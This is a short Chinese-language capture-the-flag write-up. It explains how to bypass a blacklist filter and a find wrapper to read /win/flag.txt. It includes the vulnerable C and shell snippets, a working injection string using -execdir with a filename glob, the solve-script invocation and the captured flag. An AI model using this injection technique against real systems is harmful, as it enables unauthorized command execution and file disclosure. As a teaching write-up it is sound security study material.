# archive trap — `K17{n0t_so_s3cr3t_4rchive}`

目標是讀 `/win/flag.txt`。有**兩層**過濾，各有一個洞。

## 第一層：chal.c

```c
const char *bad[] = { ";", "|", "&", "`", "$", "(", ")", "<", ">",
                      "\n", "\r", "flag", "sh", "bash", NULL };
...
snprintf(command, sizeof(command),
         "/bin/sh ./filter.sh ./box -maxdepth 1 -name %s -print", input);
system(command);
```

擋掉所有 shell metachar，也擋 `flag` / `sh` / `bash` 這三個子字串。

## 第二層：filter.sh

```sh
for arg in "$@"; do
    case "$arg" in
        -exec) echo "You don't have permission for that" >&2; exit 1 ;;
    esac
done
exec find "$@"
```

## 洞 1：`case` 只比對「完全等於 `-exec`」

`-execdir` 不會被 `-exec)` 這個 pattern 命中（沒有 `-exec*`），所以
**`-execdir` 整個通過**，直接給我們任意命令執行。

## 洞 2：`flag` 是子字串比對，但整串命令是交給 `/bin/sh` 跑的

`system()` 會起一個 shell，所以 `/win/f*.txt` 這個 glob 會由 shell 先展開成
`/win/flag.txt`——`flag` 這四個字從來沒有出現在我們送出的輸入裡。

## 組合

`-exec ... ;` 的 `;` 被擋，所以要用 `+` 結尾，而 `+` 形式規定 `{}` 必須出現，
於是把真正的目標和 `{}` 一起餵進去：

```
x -o -execdir cat /win/f*.txt {} +
```

展開後 find 實際執行的是 `cat /win/flag.txt <找到的檔案>`。

```bash
TRAP_HOST=chal.secso.cc TRAP_PORT=3000 python3 challenges/archive-trap/solve.py
```

```
./box
K17{n0t_so_s3cr3t_4rchive}cat: ./box: Is a directory
./box/notes.txt
K17{n0t_so_s3cr3t_4rchive}nothing important here, look for the flag instead
```
